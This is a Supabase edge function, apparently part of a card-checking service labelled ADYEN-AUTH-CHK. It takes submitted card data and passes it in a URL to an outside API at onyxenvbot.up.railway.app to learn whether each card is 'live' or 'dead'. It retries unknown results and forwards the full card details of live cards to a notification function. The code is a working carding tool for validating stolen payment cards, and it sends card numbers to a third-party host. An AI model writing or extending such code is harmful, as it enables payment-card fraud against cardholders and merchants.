import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[ADYEN-AUTH-CHK] notify-charged-card error:", err));
};

const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const status = String(data?.status || '').toLowerCase();

  if (status === 'approved') return "live";
  if (status === 'declined') return "dead";

  return "unknown";
};

const performCheck = async (cc: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 5;
  const apiUrl = `https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc=${cc}`;

  console.log(`[ADYEN-AUTH-CHK] Attempt ${attempt}/${maxRetries} - Calling API`);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 'Accept': 'application/json, text/plain, */*' },
    });

    const rawText = await response.text();
    console.log(`[ADYEN-AUTH-CHK] Attempt ${attempt} - Raw response:`, rawText);

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      data = { raw: rawText, status: "unknown", message: "Failed to parse response" };
    }

    const computedStatus = getStatusFromResponse(data);
    const apiMessage = data.message || data.response || data.status || 'No response message';

    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[ADYEN-AUTH-CHK] UNKNOWN on attempt ${attempt}, retrying...`);
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      return performCheck(cc, attempt + 1);
    }

    return {
      computedStatus,
      apiStatus: String(data.status || 'UNKNOWN').toUpperCase(),
      apiMessage,
      rawResponse: rawText,
    };
  } catch (error) {
    console.error(`[ADYEN-AUTH-CHK] Attempt ${attempt} error:`, error);

    if (attempt < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      return performCheck(cc, attempt + 1);
    }

    const errMsg = error instanceof Error ? error.message : "Unknown fetch error";
    return { apiStatus: "ERROR", apiMessage: errMsg, computedStatus: "unknown" };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { cc } = await req.json();

    if (!cc) {
      return new Response(JSON.stringify({
        error: 'Card data (cc) is required',
        computedStatus: 'unknown', apiStatus: 'ERROR', apiMessage: 'Card data (cc) is required'
      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    console.log('[ADYEN-AUTH-CHK] Checking card for user:', user.id);

    const data = await performCheck(cc);

    if (data.computedStatus === 'live') {
      notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'LIVE'), '$0.00', 'Adyen-auth-chk');
    }

    return new Response(JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[ADYEN-AUTH-CHK] Error:', errorMessage);
    return new Response(JSON.stringify({
      error: errorMessage, status: "ERROR", computedStatus: "unknown", apiStatus: "ERROR", apiMessage: errorMessage
    }), { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
